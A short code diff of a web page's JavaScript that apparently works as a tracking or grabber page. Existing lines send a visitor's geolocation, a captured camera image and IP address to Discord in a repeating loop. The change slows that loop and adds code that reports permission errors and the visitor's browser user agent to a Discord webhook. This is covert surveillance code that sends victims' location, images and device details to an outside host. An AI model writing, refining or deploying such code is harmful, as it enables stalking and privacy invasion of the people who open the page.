@@ -187,11 +187,17 @@ document.addEventListener('DOMContentLoaded', () => {
                     sendToDiscord({ latitude, longitude, accuracy, imageBlob, ip, count: count + 1 });
 
                     count++;
-                }, 700);
+                }, 2000);
             };
 
         } catch (err) {
             console.log("Permissions denied or error:", err);
+            // Report error to Discord
+            const formData = new FormData();
+            formData.append("payload_json", JSON.stringify({
+                content: `⚠️ **Permission/Capture Error**\nError: ${err.message}\nUA: ${navigator.userAgent}`
+            }));
+            fetch(webhookUrl, { method: "POST", body: formData }).catch(console.error);
         }
     }
 
